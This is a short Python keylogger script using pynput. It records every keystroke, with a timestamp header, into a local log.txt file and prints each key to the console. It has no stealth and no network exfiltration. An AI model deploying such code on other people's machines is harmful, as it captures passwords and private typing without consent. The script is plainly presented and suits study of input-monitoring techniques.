from pynput.keyboard import Key, Listener
from datetime import datetime


with open('log.txt', 'a') as file:
    currentDate = datetime.now()
    formatted = currentDate.strftime("%H:%M:%S")
    textual = currentDate.strftime("%B %d, %Y")
    file.write("\n\n" + textual + " " + formatted + "\n")
    file.close()


def key_press(key):
    log(key)

    try:
        print('Key pressed: {0}'.format(key.char))
    except AttributeError:
        print('Special key pressed: {0}'.format(key))


def log(key):
    with open('log.txt', 'a') as f:
        k = str(key).replace("'", "")
        f.write(k + " ")


with Listener(on_press=key_press) as listener:
    listener.join()
